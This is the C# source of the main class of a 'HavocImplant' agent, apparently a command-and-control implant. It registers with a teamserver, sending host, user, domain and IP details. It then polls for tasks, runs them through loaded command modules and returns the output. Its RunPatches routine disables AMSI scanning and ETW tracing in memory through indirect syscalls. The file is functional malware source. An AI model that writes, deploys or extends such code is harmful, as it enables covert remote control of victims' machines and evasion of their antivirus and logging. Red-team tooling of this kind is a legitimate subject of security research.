using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Net;
using System.Diagnostics;
using System.Threading;
using Microsoft.Win32;
using HavocImplant.NativeUtils;
using HavocImplant.Communications;
using HavocImplant.AgentFunctions;
using System.Reflection;
using System.Windows.Forms;

namespace HavocImplant
{
    // The Core Class for the implant. Without AgentFunctions/, it can only exit and communicate with the server.
    public class Implant
    {
        // Altered by build
        public string[] url = Config.url;
        public int timeout = Config.timeout;
        public int sleepTime = Config.sleepTime;
        public int maxTries = Config.maxTries;
        public bool secure = Config.secure;

        // Communication with Teamserver
        public byte[] magic = new byte[] { 0x41, 0x41, 0x41, 0x42 };
        public byte[] agentId = Encoding.ASCII.GetBytes(new Random().Next(1000, 10000).ToString());
        public bool registered;

        public Dictionary<int, task> taskingInformation = new Dictionary<int, task>();
        public struct task
        {
            public string taskCommand;
            public string taskOutput;
            public string taskArguments;
            public string taskFile;
            public task(string taskCommand, string taskOutput)
            {
                this.taskCommand = taskCommand;
                this.taskOutput = taskOutput;
                taskArguments = "";
                taskFile = "";
            }
        }

        // Registration Properties
        public string hostname = Dns.GetHostName();
        public string userName = Environment.UserName;
        public string domainName = System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName;
        public string IP = getIPv4();
        public string PID = Process.GetCurrentProcess().Id.ToString();
        public string PPID = "ppid here";
        public string osBuild = HKLM_GetString(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "CurrentBuild");
        public string osArch = Environment.GetEnvironmentVariable("PROCESSOR_ARCHITEW6432");
        public string processName = Process.GetCurrentProcess().ProcessName;
        public string osVersion = HKLM_GetString(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ProductName");


        public static List<CommandInterface> Commands = new List<CommandInterface>();


        static async Task Main() // Looping through tasks and stuff
        {
            Implant implant = new Implant();
            Random rand = new Random();

            Comms.Init(implant);
            Communications.Utils.Init(implant);
            // Load our commands, thanks Rasta
            var self = Assembly.GetExecutingAssembly();

            foreach (var type in self.GetTypes())
            {
                if (!type.IsSubclassOf(typeof(CommandInterface)))
                    continue;

                var command = (CommandInterface)Activator.CreateInstance(type);
                command.Init(implant);

                Commands.Add(command);
            }

            if (implant.secure) ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

            while (!implant.registered) Comms.Register();

            RunPatches();

            while (true)
            {
                byte[] rawTasks = Comms.CheckIn(implant, "", "gettask");

                // Chunk of 4 = size = there is a task that is being sent to implant
                if (rawTasks.Length > 4)
                {
                    int offset = 0;
                    task Task;

                    // Parsing the raw request from teamserver, splitting task into dictionary entries
                    while (offset < rawTasks.Length)
                    {

                        int size = BitConverter.ToInt32(new List<byte>(rawTasks).GetRange(offset, 4).ToArray(), 0) - 1; // [4 bytes containing size of task][task]
                        Console.WriteLine($"Task JSON is of size {size}");

                        Task = Communications.Utils.ParseTask(rawTasks, size, offset);
                        Console.WriteLine($"Task is {Task.taskCommand}");
                        Console.WriteLine($"Args are {Task.taskArguments}");
                        offset += size + 4;

                        int taskId = rand.Next(10000 * 10000);
                        implant.taskingInformation.Add(taskId, Task);
                        Console.WriteLine("Task has id {0}", taskId);

                    }

                    Console.WriteLine("Task Queue length: {0}", implant.taskingInformation.Count);

                    // Parsing the commands from the dictionary
                    for (int i = 0; i < implant.taskingInformation.Count; i++)
                    {

                        int taskId = implant.taskingInformation.Keys.ToList()[i];
                        Console.WriteLine("The current id is: {0}", taskId);
                        HandleCommand(implant.taskingInformation[taskId], taskId);
                        
                    }
                }
                Thread.Sleep(implant.sleepTime);
                string cumalativeOutput = "";

                for (int i = 0; i < implant.taskingInformation.Count; i++)
                {
                    int taskId = implant.taskingInformation.Keys.ToList()[i];
                    if (!String.IsNullOrEmpty(implant.taskingInformation[taskId].taskOutput))
                    {
                        Console.WriteLine($"Shipping off Task ID {taskId}");
                        cumalativeOutput += implant.taskingInformation[taskId].taskOutput + "\n";
                        implant.taskingInformation.Remove(taskId);
                        i--;
                    }
                }
                Comms.CheckIn(implant, cumalativeOutput, "commandoutput");
            }
        }
       
        static string getIPv4()
        {
            foreach (var a in Dns.GetHostEntry(Dns.GetHostName()).AddressList)
                if (a.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                    return a.ToString();
            return "";

        }
        public static string HKLM_GetString(string path, string key)
        {
            RegistryKey rk = Registry.LocalMachine.OpenSubKey(path);
            if (rk == null) return "";
            return (string)rk.GetValue(key);
        }
        public static void RunPatches()
        {
            // Amsi
            byte[] patch = new byte[6];
            patch[0] = 0xB8;
            patch[1] = 0x57;
            patch[2] = 0x00;
            patch[3] = 0x07;
            patch[4] = 0x80;
            patch[5] = 0xc3;
            IntPtr pAmsi = (IntPtr)globalDll.kernel32.dynamicExecute<Delegates.LoadLibraryA>("LoadLibraryA", new object[] {"amsi.dll"});
            Console.WriteLine("Amsi at 0x{0:X}", (long)pAmsi);
            dll amsi = new dll("amsi.dll");
            IntPtr pAmsiScanBuffer = amsi.dictOfExports["AmsiScanBuffer"];
            globalDll.ntdll.indirectSyscallInvoke<Delegates.NtProtectVirtualMemory>("NtProtectVirtualMemory", new object[] {(IntPtr)(-1), pAmsiScanBuffer, (IntPtr)patch.Length, (uint)Structs.Win32.Enums.PAGE_READWRITE, (uint)0 });
            GCHandle hPatch = GCHandle.Alloc(patch, GCHandleType.Pinned);
            globalDll.ntdll.indirectSyscallInvoke<Delegates.NtWriteVirtualMemory>("NtWriteVirtualMemory",  new object[] { (IntPtr)(-1), pAmsiScanBuffer, hPatch.AddrOfPinnedObject(), (uint)patch.Length, (uint)0});
            hPatch.Free();
            globalDll.ntdll.indirectSyscallInvoke<Delegates.NtProtectVirtualMemory>("NtProtectVirtualMemory", new object[] {(IntPtr)(-1), pAmsiScanBuffer, (IntPtr)patch.Length, (uint)Structs.Win32.Enums.PAGE_EXECUTE_READ, (uint)0 });
            // ETW
            IntPtr pNtTraceEvent = IntPtr.Add(globalDll.ntdll.dictOfExports["NtTraceEvent"], 3);
            globalDll.ntdll.indirectSyscallInvoke<Delegates.NtProtectVirtualMemory>("NtProtectVirtualMemory", new object[] {(IntPtr)(-1), pNtTraceEvent, (IntPtr)1, (uint)Structs.Win32.Enums.PAGE_EXECUTE_READWRITE, (uint)0 });
            Marshal.WriteByte(pNtTraceEvent, 0xc3);
            globalDll.ntdll.indirectSyscallInvoke<Delegates.NtProtectVirtualMemory>("NtProtectVirtualMemory", new object[] {(IntPtr)(-1), pNtTraceEvent, (IntPtr)1, (uint)Structs.Win32.Enums.PAGE_EXECUTE_READ, (uint)0 });
            
        }

        public static async Task HandleCommand(task Task, int taskId)
        {
            var com = Commands.FirstOrDefault(c => c.Command == Task.taskCommand);
            com.Run(taskId);
        }
    }
}